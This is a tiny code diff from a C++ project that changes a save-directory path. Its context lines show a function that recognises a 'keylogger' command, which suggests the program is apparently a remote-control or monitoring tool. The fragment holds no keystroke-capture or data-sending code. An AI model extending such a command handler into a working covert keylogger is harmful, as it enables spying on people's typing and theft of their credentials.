@@ -4,7 +4,7 @@
 #include "../Application/config.h"
 #include <filesystem>
 
-const string saveDir = "C:/MMT2/";
+const string saveDir = "C:/MMT/";
 
 bool is_keylogger_command(const std::string& command) {
   return command.find("keylogger") == 0;
